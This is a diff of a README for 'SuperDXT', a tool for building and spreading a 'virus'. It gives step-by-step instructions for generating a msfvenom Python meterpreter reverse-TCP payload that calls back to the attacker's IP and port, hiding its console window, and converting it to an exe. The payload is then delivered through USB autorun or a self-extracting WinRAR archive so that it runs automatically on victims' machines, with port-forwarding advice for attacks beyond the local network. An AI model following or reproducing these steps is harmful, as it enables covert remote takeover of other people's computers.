@@ -36,30 +36,24 @@ git clone https://github.com/AbdulazizDXT/SuperDXT ;cd SuperDXT ;chmod +x instal
 2. SuperDXT file window will open automatically after installation 
 3. Open Terminal and Type "msfvenom -p python/meterpreter/reverse_tcp LHOST={YourIPAddres} LPORT={Your Port} -o Update.py
 4. ReName file --> "Update.py" to "Update.pyw" For hide python console
-5. Copy the Update.pyw file to the Open SuperASS window and click Replace
+5. Copy the Update.pyw file to the Open SuperDXT window and click Replace
 6. Now the file must be transferred to the Windows system to start creating an exe file for the virus in the USB or zip files
 
 - In case you encounter a problem that Kali Linux is unable to open the working file window, you can easily go to the path you downloaded the project to such as: ``` home/kali/Desktop/SuperDXT/SuperDXT-PROJ ``` (The SuperDXT-PROJ file that transmits the python virus to it, which was created by metasploit)
 
 - If you want to test the penetration outside the network, you must open a port for the IP address of your device and also put the IPv4 address and the port that you opened in step 3.  You want to receive the connection be the same port you set. IPv4 Outside Network Here : https://whatismyipaddress.com/
 
-## [+] Use SuperDXT In USB AutoRun :
+## [+] Use SuperDXT In USB Drive (AutoRun) :
 
-1. Download USB AutoRun Creator From : https://www.samlogic.net/demos/files/USBAC-DEMO-ENG-SETUP.exe
-2. Install & Open after Installation 
-3. Now the previously modified SuperASS file should be present in your Windows system
-4. After you run the autorun program, choose the file MIN (1).exe & Then choose the USB disk & click create
-5. Now copy all the contents of the SuperASS file to the USB and then remove it, but beware not to put it again on your device, it may kill the protection completely and make it difficult to restore it, except by upgrading to the new versions of Windows such as the Insider version
-
-- Notice : When you use USB Autorun Creator, all USB contents will be deleted, be careful!
+1. Just copy all the contents of "SuperDXT-PROJ" after preparing it for hacking to the portable disk, but do not re-install the disk after disconnecting it from the device, because the payload will run automatically.
 
 ## [+]  Use SuperDXT In Zip File AutoRun :
 
 1. Download WinRAR From : https://www.win-rar.com/download.html?&L=0
 2. Install & Check [√]
-3. Go to the SuperASS file and then right click and click on Add to archive &  Click OK to start pressing... 
+3. Go to the SuperDXT file and then right click and click on Add to archive &  Click OK to start pressing... 
 4. After compressing the file, open it, then choose the "SFX" option, then "Advanced SFX Option" & Setup Option
-5. Type "MIN (1).exe" & Press OK & OK to Exit
+5. Type "MIN.exe" & Press OK & OK to Exit
 6. Now you can use zip file for hacking / Do not try on your device
 
 ## [+] How to Connect Virus/Payload :
